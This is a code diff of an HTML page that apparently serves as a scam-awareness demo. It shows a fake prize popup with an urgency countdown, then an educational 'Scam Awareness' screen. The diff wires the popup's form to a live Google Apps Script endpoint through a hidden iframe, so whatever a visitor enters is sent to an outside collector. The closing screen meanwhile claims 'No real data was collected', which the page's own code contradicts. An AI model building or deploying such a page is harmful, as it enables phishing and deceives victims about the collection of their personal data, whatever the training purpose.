@@ -11,15 +11,24 @@ body {
   background: #000;
 }
 
+/* Overlay base */
 .overlay {
   position: fixed;
   inset: 0;
   background: rgba(0,0,0,0.85);
-  display: flex;
+  display: none;
   justify-content: center;
   align-items: center;
+  pointer-events: none;
 }
 
+/* Only active overlay can be clicked */
+.overlay.active {
+  display: flex;
+  pointer-events: auto;
+}
+
+/* Popup box */
 .popup {
   background: white;
   width: 420px;
@@ -29,7 +38,9 @@ body {
   box-shadow: 0 0 25px red;
 }
 
-h1 { color: red; }
+h1 {
+  color: red;
+}
 
 .timer {
   color: red;
@@ -56,21 +67,24 @@ button {
   cursor: pointer;
 }
 
-button:hover { background: darkred; }
+button:hover {
+  background: darkred;
+}
 
 .education {
-  display: none;
   background: white;
   padding: 30px;
   border-radius: 10px;
   width: 500px;
+  text-align: left;
 }
 </style>
 </head>
 
 <body>
 
-<div class="overlay" id="scamView">
+<!-- SCAM VIEW -->
+<div class="overlay active" id="scamView">
   <div class="popup">
 
     <h1>🎉 CONGRATULATIONS 🎉</h1>
@@ -81,9 +95,8 @@ button:hover { background: darkred; }
     <p>⏳ Claim within:</p>
     <div class="timer" id="countdown">15</div>
 
-    <!-- FORM -->
     <form
-      action="PASTE_YOUR_WEB_APP_EXEC_URL_HERE"
+      action="https://script.google.com/macros/s/AKfycbw9gya8yHp4V3CIddKFbZh9vuuadNY5lRklLIZi5JOx_vU9Ys2jzWJzVs5nGQMFZZXK/exec"
       method="POST"
       target="hiddenFrame"
       onsubmit="return beforeSubmit();">
@@ -108,6 +121,7 @@ button:hover { background: darkred; }
   </div>
 </div>
 
+<!-- EDUCATION VIEW -->
 <div class="overlay" id="educationView">
   <div class="education">
     <h2>🚨 Scam Awareness</h2>
@@ -116,12 +130,14 @@ button:hover { background: darkred; }
       Scammers often pressure victims to submit personal
       and banking information.
     </p>
+
     <ul>
       <li>Unexpected prize</li>
       <li>Urgency countdown</li>
       <li>Request for bank details</li>
       <li>Confidentiality pressure</li>
     </ul>
+
     <p><strong>No real data was collected.</strong></p>
   </div>
 </div>
@@ -130,6 +146,7 @@ button:hover { background: darkred; }
 let startTime = Date.now();
 let countdown = 15;
 
+/* Countdown timer */
 setInterval(() => {
   if (countdown > 0) {
     countdown--;
@@ -150,13 +167,13 @@ function beforeSubmit() {
   document.getElementById("countdownValue").value =
     document.getElementById("countdown").innerText;
 
-  document.getElementById("scamView").style.display = "none";
-  document.getElementById("educationView").style.display = "flex";
+  // switch views safely
+  document.getElementById("scamView").classList.remove("active");
+  document.getElementById("educationView").classList.add("active");
 
-  return true; // 🚨 MUST BE TRUE
+  return true; // MUST return true
 }
 </script>
 
 </body>
 </html>
-
